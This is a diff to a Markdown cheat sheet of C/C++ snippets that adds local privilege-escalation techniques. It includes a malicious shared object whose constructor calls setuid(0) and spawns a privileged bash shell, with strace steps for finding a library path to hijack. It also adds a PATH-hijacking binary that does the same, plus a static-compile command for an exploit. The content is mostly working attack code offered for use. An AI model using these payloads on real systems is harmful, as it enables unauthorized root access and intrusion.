@@ -1,5 +1,11 @@
 # C++ Snippets Utils
 
+### Compile without dependency of GLIBC_2.XX
+
+```bash
+gcc exploit.c -o exploit -w -static
+```
+
 ### Set UID and GID
 
 ```cpp
@@ -49,8 +55,35 @@ void hijack() {
 }
 ```
 
-### Compile without dependency of GLIBC_2.XX
+### Shared Object injection
 
-```bash
-gcc exploit.c -o exploit -w -static
+```cpp
+/*
+Look for some lib: strace /your/app/here 2>&1 | grep -iE "open|access|no such file"
+Compile: gcc -shared -fPIC -o /lib/found/with/strace/lib-name.so ./injection-so.c
+Run: /your/app/here
+*/
+#include <stdio.h>
+#include <stdlib.h>
+
+static void inject() __attribute__((constructor));
+
+void inject() {
+	setuid(0);
+	system("/bin/bash -p");
+}
+```
+
+### Load library with Enviroment variables `PATH`
+
+```cpp
+/*
+Look for some lib: strings /your/app/here
+Compile: gcc -o service service.c
+Run: PATH=.:$PATH /your/app/here
+*/
+int main() {
+	setuid(0);
+	system("/bin/bash -p");
+}
 ```
